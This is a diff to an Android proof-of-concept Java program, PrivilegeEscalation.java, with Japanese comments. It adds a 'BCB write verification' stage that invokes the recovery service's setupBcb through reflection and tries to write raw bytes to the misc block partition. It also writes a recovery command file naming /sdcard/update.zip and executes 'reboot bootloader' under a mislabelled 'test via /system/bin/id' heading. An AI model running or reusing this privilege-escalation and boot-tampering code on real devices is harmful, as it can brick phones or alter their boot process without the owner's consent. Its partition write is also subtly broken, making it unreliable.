@@ -1,3 +1,4 @@
+// PrivilegeEscalation.java (完全版, BCB 書き込み検証付き)
 package com.poc;
 
 import android.os.IBinder;
@@ -7,6 +8,7 @@ import android.system.Os;
 
 import java.io.BufferedWriter;
 import java.io.File;
+import java.io.FileOutputStream;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.lang.reflect.Method;
@@ -169,6 +171,81 @@ public class Main {
                 report.append("FAILED (service null)\n");
             }
 
+            // --- [9] BCB (Bootloader Control Block) Write Verification ---
+            report.append("\n--- [9] BCB (Bootloader Control Block) Write Verification ---\n");
+
+            // 9-1. IRecoverySystem.setupBcb を試行
+            report.append("[IRecoverySystem.setupBcb(\"bootonce-bootloader\")]: ");
+            Object rec2 = getService("recovery");
+            if (rec2 != null) {
+                try {
+                    Method setupBcb = rec2.getClass().getMethod("setupBcb", String.class);
+                    boolean result = (boolean) setupBcb.invoke(rec2, "bootonce-bootloader");
+                    report.append(result ? "SUCCESS\n" : "FAILED (returned false)\n");
+                } catch (Exception e) {
+                    report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
+                }
+            } else {
+                report.append("FAILED (service null)\n");
+            }
+
+            // 9-2. 直接 /dev/block/by-name/misc への書き込み試行
+            report.append("[Direct write to misc partition]: ");
+            String[] miscPaths = {"/dev/block/by-name/misc", "/dev/block/misc"};
+            boolean written = false;
+            for (String path : miscPaths) {
+                try {
+                    File miscFile = new File(path);
+                    if (miscFile.exists() && miscFile.canWrite()) {
+                        // BCB コマンド "bootonce-bootloader" を書き込む (先頭4バイト)
+                        String cmd = "bootonce-bootloader";
+                        byte[] data = cmd.getBytes();
+                        byte[] bcb = new byte[1024];
+                        System.arraycopy(data, 0, bcb, 0, Math.min(data.length, 4));
+                        try (FileOutputStream fos = new FileOutputStream(miscFile)) {
+                            fos.write(bcb);
+                            fos.flush();
+                        }
+                        report.append("SUCCESS (written to ").append(path).append(")\n");
+                        written = true;
+                        break;
+                    }
+                } catch (Exception e) {
+                    // パスが存在しない、書き込み権限なし、などのエラーはスキップして次へ
+                }
+            }
+            if (!written) {
+                report.append("FAILED (no writable misc device found)\n");
+            }
+
+            // 9-3. /cache/recovery/command への書き込み
+            report.append("[Write /cache/recovery/command]: ");
+            try {
+                File cmdFile = new File("/cache/recovery/command");
+                if (cmdFile.exists() || cmdFile.createNewFile()) {
+                    try (FileWriter fw = new FileWriter(cmdFile)) {
+                        fw.write("--update_package=/sdcard/update.zip\n");
+                        fw.write("--bootonce-bootloader\n");
+                        fw.flush();
+                    }
+                    report.append("SUCCESS\n");
+                } else {
+                    report.append("FAILED (cannot create file)\n");
+                }
+            } catch (Exception e) {
+                report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
+            }
+
+            // 9-4. reboot bootloader コマンド実行
+            report.append("[test via /system/bin/id]: ");
+            try {
+                java.lang.Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/reboot", "bootloader"});
+                int code = p.waitFor();
+                report.append(code == 0 ? "SUCCESS (reboot initiated)\n" : "FAILED (exit=" + code + ")\n");
+            } catch (Exception e) {
+                report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
+            }
+
             report.append("\n========================================\n");
             report.append("   End of Report\n");
             report.append("========================================\n");
@@ -198,7 +275,6 @@ public class Main {
         File reportFile = new File(REPORT_PATH);
         if (!reportFile.getParentFile().exists()) reportFile.getParentFile().mkdirs();
         try (BufferedWriter w = new BufferedWriter(new FileWriter(reportFile))) { w.write(content); }
-        // ファイル権限変更はリフレクションまたは chmod コマンドで行う（android.system を使わない）
         try {
             Runtime.getRuntime().exec(new String[]{"/system/bin/chmod", "0644", REPORT_PATH});
         } catch (Exception ignored) {}
@@ -209,18 +285,15 @@ public class Main {
         catch (Exception e) { return "Error: " + e.getMessage(); }
     }
 
-    // 完全にリフレクションで Capability を取得する
+    // 完全リフレクションで Capability を取得
     private static String dumpCapabilitiesReflection() {
         try {
-            // Os.capget をリフレクションで呼び出す
             Class<?> osClass = Class.forName("android.system.Os");
-            Method capget = osClass.getMethod("capget", Object.class); // 引数は StructCapUserHeader
-            // StructCapUserHeader と StructCapUserData は実行時に存在するが、コンパイル時にはクラスパスにないため、リフレクションでアクセス
+            Method capget = osClass.getMethod("capget", Object.class);
             Class<?> headerClass = Class.forName("android.system.StructCapUserHeader");
             Object header = headerClass.getConstructor(int.class, int.class).newInstance(0x20080500, 0);
             Object dataArray = capget.invoke(null, header);
             Object[] data = (Object[]) dataArray;
-            // data[0] と data[1] から effective, permitted, inheritable を取得
             Class<?> dataClass = Class.forName("android.system.StructCapUserData");
             Method getEffective = dataClass.getMethod("effective");
             Method getPermitted = dataClass.getMethod("permitted");
